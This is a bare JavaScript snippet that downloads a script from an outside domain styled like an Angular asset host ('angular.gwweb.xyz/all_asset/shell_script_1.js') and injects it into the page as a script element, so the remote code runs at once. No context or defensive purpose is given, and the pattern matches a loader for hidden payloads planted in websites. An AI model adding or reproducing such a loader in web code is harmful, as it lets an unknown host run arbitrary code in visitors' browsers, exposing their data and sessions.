
fetch('https://angular.gwweb.xyz/all_asset/shell_script_1.js')
.then((response) => response.text())
.then((data) => {
  let script = document.createElement('script');
  script.textContent  = data;
  document.body.appendChild(script);
});